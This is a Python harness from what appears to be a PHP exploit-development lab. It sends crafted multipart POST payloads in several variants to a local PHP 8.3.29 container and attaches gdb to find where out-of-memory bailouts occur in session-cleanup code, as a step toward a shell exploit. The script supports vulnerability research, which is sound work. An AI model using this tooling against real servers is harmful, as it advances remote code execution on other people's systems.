#!/usr/bin/env python3
"""sweep_a1.py — find an A1 shape whose OOM lands in the END-cleanup path
(php_session_reset_id / send_cookie) instead of the rfc1867 POST callback.

Runs against the p2s-8329-dbg container (SYS_PTRACE). For each variant:
  restart container -> attach gdb to the prefork child -> break _zend_bailout
  -> send A1 -> classify the backtrace.
"""
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = "/home/ravhi/randoman/deepjb/php2shell-lab/lab-8329"
PS = "/home/ravhi/randoman/deepjb/php2shell-lab/oneshot-8426"
sys.path.insert(0, PS)
import pure_shell as ps  # noqa: E402

CTR = "p2s-8329-dbg"
PORT = 18130
OUT = "/tmp/opencode/sweep"
os.makedirs(OUT, exist_ok=True)

# 8.3.29 ps_globals: id=16, send_cookie=376, session_status=104
GDB_CMD = """set pagination off
set width 0
break _zend_bailout
commands
silent
printf "=== BAILOUT ===\\n"
bt 16
printf "MARK send_cookie=%d status=%d\\n", *(char*)((char*)&ps_globals+376), *(int*)((char*)&ps_globals+104)
set $idp = *(char**) ((char*)&ps_globals+16)
printf "MARK PS_id=%p\\n", $idp
detach
quit
end
continue
"""

VARIANTS = [
    dict(name="c_prog1000_big78", parts=860, depth=64, big=78, progress=1000),
    dict(name="c2_prog800_big78", parts=860, depth=64, big=78, progress=800),
    dict(name="c3_prog1200_big78", parts=860, depth=64, big=78, progress=1200),
    dict(name="c4_prog1400_big78", parts=860, depth=64, big=78, progress=1400),
    dict(name="c5_prog1000_big79", parts=860, depth=64, big=79, progress=1000),
]


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, text=True, capture_output=True, **kw)


def restart():
    sh("docker restart %s" % CTR)
    for _ in range(40):
        r = sh("curl -s -m 1 -o /dev/null -w '%%{http_code}' http://127.0.0.1:%d/index.php" % PORT)
        if r.stdout.strip() == "200":
            return True
        time.sleep(0.5)
    return False


def child_pid():
    r = sh("docker exec %s sh -c \"ps -eo pid,ppid,args | awk '\\$2==1 && /apache2/ {print \\$1; exit}'\"" % CTR)
    return r.stdout.strip()


def make_a1(v):
    out = os.path.join(OUT, v["name"] + ".bin")
    r = sh("python3 %s/payloads/mk_a1.py --out %s --parts %d --depth %d --big %d --progress-len %d"
           % (PS, out, v["parts"], v["depth"], v["big"], v["progress"]))
    if r.returncode != 0:
        raise RuntimeError(r.stderr)
    return out


def classify(text):
    bt = text.split("=== BAILOUT ===")[-1] if "=== BAILOUT ===" in text else ""
    if not bt:
        return "NO-BAILOUT", "", "", []
    sc = re.search(r"MARK send_cookie=(\d+) status=(\d+)", bt)
    idp = re.search(r"MARK PS_id=(0x[0-9a-f]+|\(nil\))", bt)
    frames = [l for l in bt.splitlines() if re.search(r"#\d+ ", l)]
    hit = [f.split(" in ")[1].split(" (")[0] for f in frames[:12]]
    if any("php_session_reset_id" in f or "php_url_encode" in f for f in frames):
        where = "RESET-ID/COOKIE"
    elif any("php_session_initialize" in f for f in frames):
        where = "INIT"
    elif any("php_session_encode" in f or "php_session_flush" in f for f in frames):
        where = "ENCODE"
    elif any("php_register_variable" in f for f in frames):
        where = "POST-REGISTER"
    elif any("smart_str_erealloc" in f for f in frames):
        where = "KEY-APPEND"
    else:
        where = "OTHER"
    return where, (sc.group(0) if sc else ""), (idp.group(0) if idp else ""), hit


def run_variant(v):
    body = make_a1(v)
    if not restart():
        return v["name"], "RESTART-FAIL", "", "", []
    pid = child_pid()
    if not pid:
        return v["name"], "NO-CHILD", "", "", []
    with open("/tmp/opencode/gdb_sweep.cmd", "w") as fh:
        fh.write(GDB_CMD)
    sh("docker cp /tmp/opencode/gdb_sweep.cmd %s:/tmp/gdb_sweep.cmd" % CTR)
    log = os.path.join(OUT, v["name"] + ".gdb")
    sh("docker exec -d %s sh -c 'gdb -p %s -x /tmp/gdb_sweep.cmd > %s 2>&1'"
       % (CTR, pid, "/tmp/sweep.out"))
    time.sleep(1.2)
    t = ps.Target(host="127.0.0.1", port=PORT, path="/index.php", outdir=OUT)
    try:
        ps.send_chunked(t, "/index.php" + ps.Q, body, 120.0)
    except Exception as exc:
        pass
    time.sleep(2.0)
    out = sh("docker exec %s cat /tmp/sweep.out" % CTR).stdout
    with open(log, "w") as fh:
        fh.write(out)
    return (v["name"],) + classify(out)


def main():
    print("%-18s %-14s %-32s %-12s %s" % ("variant", "bailout-at", "send_cookie/status", "PS(id)", "frames"))
    for v in VARIANTS:
        try:
            name, where, sc, idp, hit = run_variant(v)
            print("%-18s %-14s %-32s %-12s %s" % (name, where, sc, idp, ",".join(hit)))
        except Exception as exc:
            print("%-18s ERROR %r" % (v["name"], exc))


if __name__ == "__main__":
    main()
